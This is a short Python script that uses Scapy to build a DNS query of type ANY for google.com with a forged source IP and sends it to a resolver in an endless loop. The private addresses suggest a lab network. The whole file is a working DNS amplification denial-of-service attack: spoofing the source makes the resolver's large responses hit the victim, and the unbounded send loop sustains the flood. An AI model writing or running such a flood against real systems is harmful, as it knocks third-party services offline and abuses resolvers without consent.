from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

conf.verb = 0

request = (
    IP(src="172.16.238.10", dst="172.16.238.8") /
    UDP(dport=53) /
    DNS(rd=1, qdcount=1, qd=DNSQR(qname="google.com", qtype=255))  # 255 = ALL
)
print(len(request))
while 1:
    send(request)
